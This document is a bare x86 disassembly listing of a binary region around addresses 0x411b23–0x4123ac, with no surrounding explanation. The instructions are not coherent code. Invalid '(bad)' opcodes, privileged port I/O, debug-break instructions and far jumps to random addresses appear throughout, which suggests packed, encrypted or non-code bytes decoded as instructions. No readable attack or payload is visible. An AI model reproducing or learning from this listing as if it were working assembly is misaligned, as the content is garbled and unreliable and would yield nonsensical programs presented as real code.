  411b23:	retf   0xf2ea
  411b26:	retf   
  411b27:	mov    ah,0xd1
  411b29:	rol    ebp,cl
  411b2b:	in     al,dx
  411b2c:	mov    ecx,0xf8b4ddf7
  411b31:	xlat   BYTE PTR ds:[ebx]
  411b32:	fadd   DWORD PTR [edx]
  411b34:	mov    ebp,0xfbdce1c6
  411b39:	in     al,0xc7
  411b3b:	add    dl,bh
  411b3d:	(bad)  
  411b3f:	or     BYTE PTR [ecx],dl
  411b41:	(bad)  
  411b42:	stos   BYTE PTR es:[edi],al
  411b43:	mov    bh,0xe6
  411b45:	ret    
  411b46:	iret   
  411b47:	int3   
  411b48:	out    dx,eax
  411b49:	stc    
  411b4a:	mov    ebx,0xb8babeb4
  411b4f:	int    0xd7
  411b51:	shr    esi,1
  411b53:	cld    
  411b54:	jecxz  0x411b51
  411b56:	(bad)  
  411b57:	repnz imul eax
  411b5a:	hlt    
  411b5b:	push   cs
  411b5c:	jmp    0xb8cb:0xda0d0df5
  411b63:	jmp    0xc73d0414
  411b68:	mov    ah,0xba
  411b6a:	repz icebp 
  411b6c:	lock mov ebx,0xd1f5cfbd
  411b72:	dec    ah
  411b74:	sar    BYTE PTR [esi-0x34092a07],cl
  411b7a:	pop    es
  411b7b:	enter  0xe9e6,0xca
  411b7f:	fcom   QWORD PTR [ecx]
  411b81:	mov    dl,0xf0
  411b83:	jmp    0xef2cc848
  411b88:	aam    0xc4
  411b8a:	mov    dh,0xe4
  411b8c:	fcmovnbe st,st(1)
  411b8e:	mov    esi,0xc2d0f5f6
  411b93:	add    ebx,esi
  411b95:	aam    0xc2
  411b97:	std    
  411b98:	add    eax,0xeae7e9db
  411b9d:	add    al,0xe7
  411b9f:	std    
  411ba0:	add    al,0xca
  411ba2:	rol    cl,cl
  411ba4:	leave  
  411ba5:	fnsave [eax+eiz*8-0xe081831]
  411bac:	retf   
  411bad:	mov    ecx,0x1effccf
  411bb2:	jecxz  0x411bb2
  411bb4:	pop    es
  411bb5:	rol    edi,cl
  411bb7:	jecxz  0x411ba3
  411bb9:	add    al,al
  411bbb:	cmc    
  411bbc:	push   cs
  411bbd:	fdivrp st(4),st
  411bbf:	(bad)  
  411bc2:	jecxz  0x411ba7
  411bc4:	xlat   BYTE PTR ds:[ebx]
  411bc5:	mov    ebp,0xd7f6ede1
  411bca:	out    dx,eax
  411bcb:	div    DWORD PTR [eax+0x2f0b9cd]
  411bd1:	sti    
  411bd2:	loopne 0x411bd0
  411bd4:	rol    bl,0xde
  411bd7:	fsubr  st(0),st
  411bd9:	fld    QWORD PTR [edi]
  411bdb:	retf   0x8fe
  411bde:	in     al,0x2
  411be0:	fcom   st(0)
  411be2:	(bad)  
  411be3:	fidivr WORD PTR [ebp-0x19043754]
  411be9:	sar    edx,1
  411beb:	mov    edi,0xe303e5fa
  411bf0:	in     eax,dx
  411bf1:	mov    edi,0xc5d2fcbd
  411bf6:	inc    esp
  411bf8:	fmul   st,st(2)
  411bfa:	ror    ebx,0xe5
  411bfd:	into   
  411bfe:	int    0xc1
  411c00:	jmp    0xc0ac:0xebe8e7ae
  411c07:	jecxz  0x411bbd
  411c09:	in     al,dx
  411c0a:	les    esi,FWORD PTR [ebp+ebx*8-0xe09022c]
  411c11:	add    ecx,esp
  411c13:	fidivr DWORD PTR [eax-0x2646fe45]
  411c19:	lock add eax,0xe4fcf8e1
  411c1f:	pop    es
  411c20:	push   cs
  411c21:	scas   eax,DWORD PTR es:[edi]
  411c22:	mov    esi,0xc9f2c6ac
  411c27:	mov    cl,0xee
  411c29:	icebp  
  411c2a:	mov    ecx,0xd7e9b5b8
  411c2f:	add    dl,ah
  411c31:	fnstsw WORD PTR [edi-0x1c054800]
  411c37:	(bad)  
  411c38:	(bad)  
  411c39:	fucomi st,st(7)
  411c3b:	xlat   BYTE PTR ds:[ebx]
  411c3c:	leave  
  411c3d:	out    dx,eax
  411c3e:	frndint 
  411c40:	or     bl,al
  411c42:	mov    bl,0xcb
  411c44:	(bad)  
  411c45:	shl    ch,0xfb
  411c48:	jmp    0x411c0f
  411c4a:	(bad)  
  411c4b:	mov    ch,0xcf
  411c4d:	(bad)  
  411c4f:	mov    esp,0xf9f500ea
  411c54:	mov    eax,0xfdd8bdcc
  411c59:	add    eax,0xe50ddfe3
  411c5e:	retf   0xe812
  411c61:	mov    ecx,0xe2f1b0cb
  411c66:	in     al,dx
  411c67:	loop   0x411c52
  411c69:	mov    edx,0xc9d8f0b6
  411c6e:	mov    ecx,0xd403bd02
  411c73:	loop   0x411c43
  411c75:	(bad)  
  411c76:	icebp  
  411c77:	pop    es
  411c78:	cmc    
  411c79:	pop    es
  411c7a:	hlt    
  411c7b:	mov    ebp,0xc8e9e5d5
  411c80:	in     al,dx
  411c81:	int    0xf7
  411c83:	scas   eax,DWORD PTR es:[edi]
  411c84:	retf   
  411c85:	jecxz  0x411c6c
  411c87:	repz in al,0xd7
  411c8a:	into   
  411c8b:	(bad)  
  411c8c:	std    
  411c8d:	hlt    
  411c8e:	clc    
  411c8f:	mov    edx,0x603f2fe
  411c94:	rol    edi,0xc0
  411c97:	add    ebx,ebx
  411c99:	cli    
  411c9a:	(bad)  
  411c9c:	push   cs
  411c9d:	lds    eax,FWORD PTR [edx]
  411c9f:	jmp    0x411c8d
  411ca1:	int3   
  411ca2:	lock mov esp,0xd2d1e3ef
  411ca8:	neg    cl
  411caa:	aam    0xfe
  411cac:	cmc    
  411cad:	cli    
  411cae:	in     eax,dx
  411caf:	mov    edi,0xd1f1f3f6
  411cb4:	in     al,dx
  411cb5:	mov    ebp,0xe0f4d0d9
  411cba:	pop    es
  411cbb:	(bad)  
  411cbc:	call   0xa0e1589
  411cc1:	les    esi,FWORD PTR [edx-0x551a2c40]
  411cc7:	mov    dl,0xc4
  411cc9:	shl    DWORD PTR [edi+edi*4-0xf061a54],0xca
  411cd1:	leave  
  411cd2:	mov    edi,0xfcd3c1bd
  411cd7:	repz std 
  411cd9:	retf   0xfee2
  411cdc:	test   BYTE PTR [edx],0xb
  411cdf:	adc    ch,dh
  411ce1:	(bad)  
  411ce2:	out    0xc7,al
  411ce4:	mul    al
  411ce6:	mov    dh,0xc5
  411ce8:	mul    esp
  411cea:	jmp    0x1db:0xbcb8ccd9
  411cf1:	inc    DWORD PTR [edx]
  411cf3:	rol    cl,1
  411cf5:	(bad)
  411cf8:	out    0xc3,eax
  411cfa:	out    0xdb,eax
  411cfc:	(bad)  
  411cfe:	hlt    
  411cff:	fild   DWORD PTR [ecx]
  411d01:	jmp    0xaf25e3ee
  411d06:	lods   eax,DWORD PTR ds:[esi]
  411d07:	in     al,0xc6
  411d09:	leave  
  411d0a:	sar    DWORD PTR [eax-0x2435112b],cl
  411d10:	ret    
  411d11:	add    DWORD PTR [esp+edi*8-0x524032e],edi
  411d18:	test   DWORD PTR [esi],0xd4f9dfeb
  411d1e:	cld    
  411d1f:	loop   0x411d27
  411d21:	mov    eax,0xf3beadae
  411d26:	ret    
  411d27:	(bad)  
  411d28:	repnz (bad) 
  411d2a:	mul    ah
  411d2c:	(bad)  
  411d2d:	(bad)  
  411d2f:	call   0xbe231f22
  411d34:	fld    DWORD PTR ds:0xc3dff300
  411d3a:	clc    
  411d3b:	retf   0xe2bc
  411d3e:	in     al,0xfd
  411d40:	bswap  eax
  411d42:	mov    esp,0xeee5cacc
  411d47:	ret    
  411d48:	loopne 0x411d42
  411d4a:	int    0xfb
  411d4c:	leave  
  411d4d:	hlt    
  411d4e:	sti    
  411d4f:	xlat   BYTE PTR ds:[ebx]
  411d50:	iret   
  411d51:	ret    0xe3c0
  411d54:	add    al,ch
  411d56:	mov    esp,0xe0bfcada
  411d5b:	hlt    
  411d5c:	add    eax,0xae1e1c9
  411d61:	loop   0x411d3f
  411d63:	imul   BYTE PTR [esi-0x1937161f]
  411d69:	jmp    0xf03d143e
  411d6e:	in     eax,dx
  411d6f:	(bad)  
  411d70:	aad    0xfe
  411d72:	sar    esp,cl
  411d74:	std    
  411d75:	icebp  
  411d76:	rol    esi,0xe5
  411d79:	jmp    0xe30a:0xc502e2cb
  411d80:	add    eax,0xd0d6c8cb
  411d85:	jecxz  0x411d63
  411d87:	mov    dl,0xb5
  411d89:	retf   0xdbf2
  411d8c:	stc    
  411d8d:	mov    ch,0xd4
  411d8f:	retf   
  411d90:	sti    
  411d91:	enter  0xbffa,0xd6
  411d95:	fsub   st,st(2)
  411d97:	neg    eax
  411d99:	loopne 0x411da5
  411d9b:	fiadd  WORD PTR [ebx*8-0x30f9f4fc]
  411da2:	shr    ecx,0xd1
  411da5:	(bad)  
  411da6:	loop   0x411d5b
  411da8:	(bad)  
  411da9:	mov    ebx,0xfefbb8ce
  411dae:	iret   
  411daf:	aad    0xe8
  411db1:	leave  
  411db2:	std    
  411db3:	loope  0x411db1
  411db5:	fdivr  st(1),st
  411db7:	lock fld QWORD PTR [esi]
  411dba:	(bad)  
  411dbc:	or     cl,ch
  411dbe:	fcmovnu st,st(1)
  411dc0:	jmp    0xb0cc:0xe1dfecbf
  411dc7:	icebp  
  411dc8:	rcl    dh,cl
  411dca:	(bad)  
  411dcb:	in     eax,dx
  411dcc:	in     eax,0xb9
  411dce:	repz (bad) 
  411dd0:	mov    edi,0xf5d1fef4
  411dd5:	(bad)  
  411dd7:	out    0xdb,al
  411dd9:	mov    edi,0xdf4bdf5
  411dde:	into   
  411ddf:	in     al,0xc0
  411de1:	(bad)  
  411de3:	lods   eax,DWORD PTR ds:[esi]
  411de4:	faddp  st(7),st
  411de6:	in     al,dx
  411de7:	lods   al,BYTE PTR ds:[esi]
  411de8:	loope  0x411db1
  411dea:	iret   
  411deb:	sti    
  411dec:	mov    esi,0xf8d9fdfb
  411df1:	in     eax,dx
  411df2:	in     eax,dx
  411df3:	fistp  QWORD PTR [edi-0x1e343c0f]
  411df9:	out    0xc5,al
  411dfb:	clc    
  411dfc:	bswap  ebx
  411dfe:	in     eax,0xca
  411e00:	or     eax,0xb1e5bcf1
  411e05:	rcl    esp,0xd1
  411e08:	mov    al,0xbb
  411e0a:	jmp    0xe2dd:0xebd5fdc4
  411e11:	rol    DWORD PTR [ecx],cl
  411e13:	fidivr DWORD PTR [edi-0x3f07030a]
  411e19:	loopne 0x411e18
  411e1b:	clc    
  411e1c:	jmp    ebp
  411e1e:	in     eax,dx
  411e1f:	call   0xa92ff802
  411e24:	ret    
  411e25:	enter  0xf4e8,0xfa
  411e29:	out    dx,al
  411e2a:	(bad)  
  411e2b:	mov    al,0xd1
  411e2d:	mov    ah,0xd6
  411e2f:	mov    ch,0xfe
  411e31:	fdiv   st(7),st
  411e33:	out    0xfe,eax
  411e35:	ret    
  411e36:	loopne 0x411e0c
  411e38:	retf   0x4e7
  411e3b:	iret   
  411e3c:	pop    es
  411e3d:	fcmovne st,st(1)
  411e3f:	iret   
  411e40:	jmp    0xcfc8:0xeca5d2cd
  411e47:	iret   
  411e48:	mov    edx,0xf0cdb6d5
  411e4d:	jmp    0xd617fb22
  411e52:	repz ror esp,0xc6
  411e56:	ret    0xf5f7
  411e59:	add    ebx,ecx
  411e5b:	jmp    0x411e46
  411e5d:	push   cs
  411e5e:	or     al,0xdf
  411e60:	(bad)  
  411e62:	out    dx,al
  411e63:	mul    bh
  411e65:	(bad)  
  411e66:	out    dx,al
  411e67:	retf   0xf0c9
  411e6a:	les    edi,FWORD PTR [edi-0x1d250154]
  411e70:	icebp  
  411e71:	add    DWORD PTR [edi-0xd390f0d],edi
  411e77:	jmp    0x411e40
  411e79:	add    eax,edx
  411e7b:	(bad)  
  411e7c:	retf   0xf4db
  411e7f:	enter  0xced3,0xdf
  411e83:	div    cl
  411e85:	int    0xe4
  411e87:	jecxz  0x411e62
  411e89:	repnz out 0xeb,al
  411e8c:	fucomp st(1)
  411e8e:	in     al,dx
  411e8f:	retf   0xedb4
  411e92:	clc    
  411e93:	mov    esi,0xc5dff7f7
  411e98:	hlt    
  411e99:	idiv   edi
  411e9b:	pop    es
  411e9c:	add    bl,bh
  411e9e:	in     eax,dx
  411e9f:	(bad)  
  411ea0:	shrd   eax,esp,0xea
  411ea4:	out    0xb3,al
  411ea6:	mov    al,0xb1
  411ea8:	hlt    
  411ea9:	retf   0xd6b6
  411eac:	sar    BYTE PTR [edx+0x2e8e2cf],cl
  411eb2:	mov    esi,0xf1d5c6bd
  411eb7:	or     esi,edx
  411eb9:	add    bh,dh
  411ebb:	in     eax,0xf8
  411ebd:	loope  0x411eca
  411ebf:	retf   
  411ec0:	rol    al,0xb1
  411ec3:	in     al,dx
  411ec4:	mov    dl,0xae
  411ec6:	mov    ch,0xcc
  411ec8:	int    0xf0
  411eca:	rep lods eax,DWORD PTR ds:[esi]
  411ecc:	fcmovbe st,st(0)
  411ece:	imul   dh
  411ed0:	clc    
  411ed1:	call   0xe01ff7d0
  411ed6:	add    BYTE PTR [ebx],al
  411ed8:	or     edx,ebp
  411eda:	loope  0x411ec0
  411edc:	(bad)  
  411edd:	fmul   QWORD PTR [edi]
  411edf:	add    cl,bl
  411ee1:	shl    cl,cl
  411ee3:	lods   eax,DWORD PTR ds:[esi]
  411ee4:	mov    bl,0xe6
  411ee6:	mov    ch,0xd3
  411ee8:	mov    bh,0xb7
  411eea:	mov    eax,0xfaf2ddf9
  411eef:	fld    DWORD PTR [ebx]
  411ef1:	jmp    0xfb3f26d5
  411ef6:	(bad)  
  411ef8:	fmul   QWORD PTR [edx]
  411efa:	loopne 0x411ed6
  411efc:	fucomip st,st(0)
  411efe:	(bad)  
  411eff:	rol    DWORD PTR [esi],cl
  411f01:	lock mov edi,0xf4b5c0ee
  411f07:	(bad)  
  411f08:	retf   0xcec6
  411f0b:	repz leave 
  411f0d:	mov    ah,0xbd
  411f0f:	fdivr  st(7),st
  411f11:	add    BYTE PTR [esi-0x26122729],dh
  411f17:	cmc    
  411f18:	jmp    0xe2e8:0x509fafd
  411f1f:	jecxz  0x411f08
  411f21:	int3   
  411f22:	lods   eax,DWORD PTR ds:[esi]
  411f23:	shr    DWORD PTR [ebp-0x37441b4f],1
  411f29:	(bad)  
  411f2a:	fcmovnbe st,st(4)
  411f2c:	fdivp  st(5),st
  411f2e:	jmp    0xe3fefaec
  411f33:	(bad)  
  411f34:	in     eax,dx
  411f35:	in     al,dx
  411f36:	loop   0x411f03
  411f38:	push   es
  411f39:	fild   WORD PTR [ebx]
  411f3b:	(bad)  
  411f3c:	cld    
  411f3d:	out    0xe8,al
  411f3f:	cld    
  411f40:	out    dx,al
  411f41:	mov    edi,0xd5ceb2c1
  411f46:	out    0xeb,eax
  411f48:	in     eax,dx
  411f49:	leave  
  411f4a:	(bad)  
  411f4b:	(bad)  
  411f4c:	out    dx,eax
  411f4d:	shl    edi,1
  411f4f:	mov    esi,0xccbccdf4
  411f54:	sar    DWORD PTR [ebp-0x7393dff],0x3
  411f5b:	mul    ecx
  411f5d:	fild   DWORD PTR [esi]
  411f5f:	fstp   st(4)
  411f61:	jecxz  0x411f20
  411f63:	test   al,0xf1
  411f65:	loope  0x411f2e
  411f67:	(bad)  
  411f68:	mov    bh,0xe0
  411f6a:	hlt    
  411f6b:	neg    ebx
  411f6d:	std    
  411f6e:	fstp   st(3)
  411f70:	rol    dl,cl
  411f72:	repz in eax,dx
  411f74:	in     al,dx
  411f75:	in     al,dx
  411f76:	aam    0xd6
  411f78:	(bad)  
  411f79:	jmp    0xe30afd7d
  411f7e:	or     eax,0xf3f2ee01
  411f83:	repnz mov bh,0xee
  411f86:	mov    cl,0xfa
  411f88:	shl    ah,1
  411f8a:	fnsetpm(287 only) 
  411f8c:	cli    
  411f8d:	mov    ebp,0xddbcb1d4
  411f92:	into   
  411f93:	mov    ebp,0xebdfd8dc
  411f98:	neg    dh
  411f9a:	rcr    bh,0xbc
  411f9d:	stc    
  411f9e:	jmp    0xed1a1a83
  411fa3:	mov    ebp,0xcdeae8b0
  411fa8:	(bad)
  411fab:	out    dx,eax
  411fac:	fldlg2 
  411fae:	jmp    0xcdf3:0xcebab9ca
  411fb5:	div    ecx
  411fb7:	rcl    edi,0xf5
  411fba:	lock fadd st(0),st
  411fbd:	jmp    0xb3dc:0xa7f3c1e2
  411fc4:	in     al,dx
  411fc5:	fsub   st(7),st
  411fc7:	shl    ch,0xc1
  411fca:	mov    bh,0xee
  411fcc:	fcmovne st,st(3)
  411fce:	fsubp  st(7),st
  411fd0:	(bad)  
  411fd2:	shl    dl,1
  411fd4:	loope  0x411fbc
  411fd6:	les    edi,FWORD PTR [ebp-0x10f0f52a]
  411fdc:	iret   
  411fdd:	out    0xdd,eax
  411fdf:	fdivp  st(4),st
  411fe1:	(bad)  
  411fe2:	fdivr  QWORD PTR [ebp-0x334b151d]
  411fe8:	mov    ch,0xdb
  411fea:	in     al,0xb7
  411fec:	push   DWORD PTR [edx+edx*8-0x8463002]
  411ff3:	aad    0xd7
  411ff5:	icebp  
  411ff6:	sar    ecx,0xf1
  411ff9:	(bad)  
  411ffb:	fsubp  st(7),st
  411ffd:	clc    
  411ffe:	(bad)  
  412000:	or     eax,0xdce8aeb8
  412005:	repnz shr DWORD PTR [ebp-0x364f4b4b],cl
  41200c:	mov    dh,0xbd
  41200e:	repz in al,dx
  412010:	hlt    
  412011:	mov    bh,0xcc
  412013:	int3   
  412014:	fld    DWORD PTR [edx]
  412016:	ror    BYTE PTR [edx],0xde
  412019:	add    eax,0xe6e4d50b
  41201e:	aam    0xe
  412020:	in     eax,0xdf
  412022:	test   eax,0xb1e6a8d6
  412027:	fcmovnbe st,st(2)
  412029:	mov    edx,0xebdbcfe0
  41202e:	in     al,dx
  41202f:	(bad)  
  412030:	in     al,dx
  412031:	ror    dh,cl
  412033:	(bad)  
  412035:	cmc    
  412036:	repz jmp 0x41200a
  412039:	fisttp QWORD PTR [edi]
  41203b:	add    cl,BYTE PTR [eax]
  41203d:	add    eax,0xd2e8cbe3
  412042:	out    0xed,al
  412044:	mov    bl,0xae
  412046:	hlt    
  412047:	call   0xf42c1615
  41204c:	repnz cmc 
  41204e:	fcmovu st,st(7)
  412050:	xlat   BYTE PTR ds:[ebx]
  412051:	out    dx,eax
  412052:	out    0xdc,eax
  412054:	std    
  412055:	pop    es
  412056:	mov    ebp,0xf6f7d7f1
  41205b:	fcmovnu st,st(4)
  41205d:	or     esi,esp
  41205f:	enter  0xaa03,0xbf
  412063:	(bad)  
  412064:	mov    ebp,0xfbb3c5dd
  412069:	in     al,dx
  41206a:	sti    
  41206b:	repz fcmovnbe st,st(1)
  41206e:	std    
  41206f:	(bad)  
  412071:	mov    eax,0xbed4e7d8
  412076:	cmc    
  412077:	mov    ebp,0xdec0fefa
  41207c:	cld    
  41207d:	loopne 0x41207f
  41207f:	call   0xc014c94c
  412084:	in     eax,0xb7
  412086:	rcr    ebx,cl
  412088:	mov    ch,0xe7
  41208a:	jmp    0xe02ded66
  41208f:	ret    
  412090:	mov    edi,0xbccfc2c9
  412095:	aad    0xe5
  412097:	shl    cl,0xc9
  41209a:	pavgw  mm5,mm3
  41209d:	std    
  41209e:	add    BYTE PTR [edx],dl
  4120a0:	jecxz  0x412071
  4120a2:	iret   
  4120a3:	out    dx,eax
  4120a4:	xlat   BYTE PTR ds:[ebx]
  4120a5:	xlat   BYTE PTR ds:[ebx]
  4120a6:	idiv   ebx
  4120a8:	cli    
  4120a9:	retf   0xb4db
  4120ac:	jmp    0xdb3817a8
  4120b1:	ret    
  4120b2:	mov    ebp,0xb00dbfa
  4120b7:	jmp    0xece7:0xdffcf6d2
  4120be:	fdiv   st(2),st
  4120c0:	enter  0xc1d9,0xeb
  4120c4:	mul    bl
  4120c6:	mov    ah,0xd7
  4120c8:	test   dl,0xf8
  4120cb:	out    dx,al
  4120cc:	fmul   st,st(1)
  4120ce:	sar    BYTE PTR [edi-0x1c26161f],1
  4120d4:	in     al,dx
  4120d5:	hlt    
  4120d6:	lds    eax,FWORD PTR [edi]
  4120d8:	cmc    
  4120d9:	mov    BYTE PTR [ecx],0xcb
  4120dc:	loopne 0x4120df
  4120de:	stc    
  4120df:	out    dx,eax
  4120e0:	in     al,dx
  4120e1:	loop   0x4120ad
  4120e3:	mov    ebp,0xadc5f1ea
  4120e8:	aam    0xe6
  4120ea:	out    0xfe,al
  4120ec:	in     eax,0xe5
  4120ee:	lock (bad) 
  4120f0:	fdiv   st(7),st
  4120f2:	mov    dh,0xbc
  4120f4:	repz (bad) 
  4120f7:	push   es
  4120f8:	icebp  
  4120f9:	lock ror cl,1
  4120fc:	or     esp,eax
  4120fe:	in     al,dx
  4120ff:	push   es
  412100:	loop   0x4120ac
  412102:	rcr    ebp,1
  412104:	mov    bh,0xd7
  412106:	int    0xef
  412108:	in     eax,dx
  412109:	(bad)  
  41210a:	mov    ebx,0xecf7b7df
  41210f:	std    
  412110:	cmc    
  412111:	loopne 0x4120fa
  412113:	mov    ch,0xc3
  412115:	jecxz  0x41211b
  412117:	rol    BYTE PTR [ebx],1
  412119:	jmp    0xd60ce919
  41211e:	jmp    0x4120e8
  412120:	or     edx,edx
  412122:	scas   al,BYTE PTR es:[edi]
  412123:	les    ebp,FWORD PTR [eax-0x571f4d16]
  412129:	loopne 0x4120db
  41212b:	in     al,0xca
  41212d:	lock iret 
  41212f:	hlt    
  412130:	mov    esi,0xdaf6c2e0
  412135:	loop   0x41212f
  412137:	cli    
  412138:	jmp    0xd948f926
  41213d:	retf   
  41213e:	push   es
  41213f:	push   es
  412140:	jmp    edi
  412142:	out    0xc4,eax
  412144:	faddp  st(5),st
  412146:	int    0xef
  412148:	ror    bh,cl
  41214a:	mov    edx,0xb4f2f5d1
  41214f:	cli    
  412150:	mov    esp,0xe7bdb9
  412155:	repz rol DWORD PTR [edx],1
  412158:	add    ebx,eax
  41215a:	pop    es
  41215b:	add    ebp,eax
  41215d:	or     al,0xc
  41215f:	enter  0xd0e4,0xd8
  412163:	mov    cl,0xd3
  412165:	scas   al,BYTE PTR es:[edi]
  412166:	mov    cl,0xe6
  412168:	out    0xee,al
  41216a:	(bad)  
  41216c:	in     eax,dx
  41216d:	leave  
  41216e:	aad    0xbf
  412170:	rol    DWORD PTR [ecx],cl
  412172:	into   
  412173:	mov    edi,0xc5c1fbd4
  412178:	jmp    0xe9c6:0xe0efd600
  41217f:	or     eax,0xa9d2d1ee
  412184:	icebp  
  412185:	mov    ebp,0xf8b0d4eb
  41218a:	jmp    0xf340da54
  41218f:	leave  
  412190:	mov    edi,0xf7d3bac1
  412195:	xlat   BYTE PTR ds:[ebx]
  412196:	fdivr  st(3),st
  412198:	ret    0x2c5
  41219b:	fsubr  st(4),st
  41219d:	push   es
  41219e:	add    bh,cl
  4121a0:	push   cs
  4121a1:	stos   DWORD PTR es:[edi],eax
  4121a2:	rol    ebx,1
  4121a4:	mov    cl,0xc2
  4121a6:	out    0xd6,al
  4121a8:	leave  
  4121a9:	hlt    
  4121aa:	jmp    edi
  4121ac:	push   DWORD PTR [ebx-0xd1d1244]
  4121b2:	mov    dh,0xe6
  4121b4:	xlat   BYTE PTR ds:[ebx]
  4121b5:	aad    0x2
  4121b7:	vpsubd xmm3,xmm3,xmm3
  4121bb:	or     al,BYTE PTR [eax]
  4121bd:	add    eax,0xbe0fcf0c
  4121c2:	(bad)  
  4121c3:	lods   al,BYTE PTR ds:[esi]
  4121c4:	in     eax,dx
  4121c5:	loop   0x4121ad
  4121c7:	rol    ch,1
  4121c9:	out    0xef,al
  4121cb:	fidiv  WORD PTR [edi+0x2dcd7ba]
  4121d1:	std    
  4121d2:	ret    
  4121d3:	out    0x7,al
  4121d5:	sar    ah,1
  4121d7:	std    
  4121d8:	in     eax,0x3
  4121da:	(bad)
  4121dd:	or     dh,bl
  4121df:	fld    QWORD PTR [ebx]
  4121e1:	mov    ebp,0xcbdce2a9
  4121e6:	aad    0xda
  4121e8:	loopne 0x4121cb
  4121ea:	jmp    0x4121b7
  4121ec:	lock shl edx,cl
  4121ef:	iret   
  4121f0:	hlt    
  4121f1:	mov    bh,0xdd
  4121f3:	sar    DWORD PTR [ebp-0x2e2b4127],0xdc
  4121fa:	or     BYTE PTR [edi],al
  4121fc:	or     dl,cl
  4121fe:	retf   0xdafb
  412201:	shl    DWORD PTR [ebx-0x2b493b12],0xd6
  412208:	repz repz jmp 0xcaf9:0xd0cfd9c4
  412211:	int    0xcd
  412213:	iret   
  412214:	(bad)  
  412216:	jmp    0x412223
  412218:	loope  0x4121f7
  41221a:	shl    dh,0x4
  41221d:	add    edi,eax
  41221f:	adc    edx,DWORD PTR [edx]
  412221:	lock retf 
  412223:	(bad)  
  412224:	repnz out dx,eax
  412226:	loopne 0x4121d8
  412228:	mov    edx,0xe4adb1e8
  41222d:	mov    bl,0xbf
  41222f:	div    esp
  412231:	cmc    
  412232:	std    
  412233:	(bad)  
  412234:	cld    
  412235:	fcmovbe st,st(2)
  412237:	fild   WORD PTR [edi]
  412239:	xlat   BYTE PTR ds:[ebx]
  41223a:	(bad)  
  41223d:	std    
  41223e:	in     eax,0xcc
  412240:	loopne 0x412205
  412242:	(bad)  
  412243:	out    0xe0,al
  412245:	shl    BYTE PTR [edi-0x1531120b],cl
  41224b:	jmp    0xfb31fa3b
  412250:	cld    
  412251:	add    BYTE PTR [esi+0x6c1dff9],dh
  412257:	les    ecx,FWORD PTR [ecx]
  412259:	out    0xd6,al
  41225b:	(bad)  
  41225c:	cli    
  41225d:	clc    
  41225e:	ret    0x12c9
  412261:	enter  0xa9b3,0xac
  412265:	scas   eax,DWORD PTR es:[edi]
  412266:	shl    dh,1
  412268:	loopne 0x412259
  41226a:	icebp  
  41226b:	retf   
  41226c:	sar    DWORD PTR [edx+0x1feebbf],cl
  412272:	jecxz  0x41224d
  412274:	fadd   st(2),st
  412276:	push   es
  412277:	add    eax,edx
  412279:	(bad)  
  41227c:	or     BYTE PTR [eax],cl
  41227e:	adc    eax,DWORD PTR [ecx]
  412280:	in     al,0xc6
  412282:	mov    al,0xbe
  412284:	jmp    0x412267
  412286:	lods   al,BYTE PTR ds:[esi]
  412287:	in     eax,0xf2
  412289:	rcr    ebx,cl
  41228b:	not    edx
  41228d:	mov    eax,0xbbeeb4bc
  412292:	repnz add dh,bl
  412295:	repz add DWORD PTR [esp+eax*8],eax
  412299:	ret    0xf6ef
  41229c:	call   0xc0aef90
  4122a1:	mov    eax,0xe3cfd1e8
  4122a6:	int3   
  4122a7:	cmc    
  4122a8:	jmp    0xe8fd:0xf1fbd7bb
  4122af:	mov    ah,0xf9
  4122b1:	enter  0xf8f9,0x3
  4122b5:	mov    dh,0xc4
  4122b8:	in     al,0xde
  4122ba:	std    
  4122bb:	add    al,0xea
  4122bd:	out    dx,eax
  4122be:	fisttp QWORD PTR [ecx]
  4122c0:	call   0xa4f51a83
  4122c5:	lods   al,BYTE PTR ds:[esi]
  4122c6:	fdivr  st(3),st
  4122c8:	test   al,0xfb
  4122ca:	mov    ah,0xd7
  4122cc:	icebp  
  4122cd:	hlt    
  4122ce:	fstp   st(0)
  4122d0:	sar    dh,1
  4122d2:	mov    eax,0xfad3cec2
  4122d7:	loop   0x4122aa
  4122d9:	ret    0xd709
  4122dc:	faddp  st(3),st
  4122de:	in     eax,0xa
  4122e0:	clc    
  4122e1:	out    dx,eax
  4122e2:	retf   0xc9a5
  4122e5:	test   bl,0xb4
  4122e8:	loopne 0x4122c5
  4122ea:	mov    edx,0xdff2f0d5
  4122ef:	call   0xee4303c0
  4122f4:	pop    es
  4122f5:	shl    bh,0x3
  4122f8:	repnz leave 
  4122fa:	out    0xd9,al
  4122fc:	(bad)  
  4122fd:	out    dx,eax
  4122fe:	or     eax,0xe6e4f8c4
  412303:	(bad)  
  412305:	ret    
  412306:	iret   
  412307:	mov    bh,0xac
  412309:	fcmovne st,st(7)
  41230b:	iret   
  41230c:	stc    
  41230d:	clc    
  41230e:	aam    0xfd
  412310:	jecxz  0x412307
  412312:	jecxz  0x4122d4
  412314:	out    0x3,eax
  412316:	(bad)  
  412318:	(bad)
  41231b:	(bad)  
  41231d:	stc    
  41231e:	retf   
  41231f:	int    0xc4
  412321:	icebp  
  412322:	jmp    0xc629f4ed
  412327:	jmp    0xb739f0df
  41232c:	(bad)  
  41232d:	fdiv   DWORD PTR [edx+ecx*8+0x1d3fbf3]
  412334:	in     eax,0xfe
  412336:	hlt    
  412337:	loope  0x41231a
  412339:	stc    
  41233a:	add    eax,0xd402e502
  41233f:	sti    
  412340:	out    dx,al
  412341:	fsub   st,st(1)
  412343:	ret    
  412344:	rep lods al,BYTE PTR ds:[esi]
  412346:	jecxz  0x412315
  412348:	mov    dl,0xc1
  41234a:	mov    eax,0xd2dfb9f2
  41234f:	jmp    0xc7e0:0xdaf5efff
  412356:	cld    
  412357:	mov    ebp,0x7d5c7ff
  41235c:	add    al,0x8
  41235e:	or     al,ah
  412360:	repz lock scas eax,DWORD PTR es:[edi]
  412363:	imul   ebp
  412365:	int    0xc2
  412367:	mov    ah,0xa8
  412369:	mov    edx,0xf8cecec8
  41236e:	out    dx,al
  41236f:	xlat   BYTE PTR ds:[ebx]
  412370:	out    dx,eax
  412371:	std    
  412372:	rol    ecx,0xcd
  412375:	add    al,0xd7
  412377:	lock mul ebx
  41237a:	add    al,0xbd
  41237c:	loopne 0x41237a
  41237e:	jmp    0xe8e1:0xbdd9e5e9
  412385:	mov    bh,0xec
  412387:	test   eax,0xf6e4baf7
  41238c:	in     al,0xb9
  41238e:	retf   
  41238f:	(bad)  
  412391:	iret   
  412392:	repz sar bh,0x5
  412396:	test   DWORD PTR [eax],0xfc6e6d9
  41239c:	or     ch,dh
  41239e:	pop    es
  41239f:	fadd   st(4),st
  4123a1:	rol    ebx,cl
  4123a3:	repz lock shr BYTE PTR [ebx+esi*4-0x2d12093e],1
  4123ac:	(bad)  
